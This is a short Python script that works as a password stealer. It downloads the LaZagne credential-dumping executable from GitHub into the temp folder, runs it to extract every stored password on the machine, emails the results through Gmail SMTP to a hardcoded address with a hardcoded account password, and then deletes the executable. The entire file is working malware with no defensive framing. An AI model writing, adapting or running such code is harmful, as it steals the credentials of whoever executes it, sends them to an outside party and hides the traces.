#! /usr/bin/env python

import requests
import smtplib
import subprocess
import os
import tempfile


def download_file(url):
    get_response = requests.get(url)
    file_name = url.split('/')[-1]
    with open(file_name, "wb") as output_file:
        output_file.write(get_response.content)


def send_mail(email, password, message):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


url = "https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe"
temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)
download_file(url)

result = subprocess.check_output('lazagne.exe all', shell=True)
send_mail('akgautam97211@gmail.com', 'adepg91189&*#akg', result)
os.remove(url.split('/')[-1])
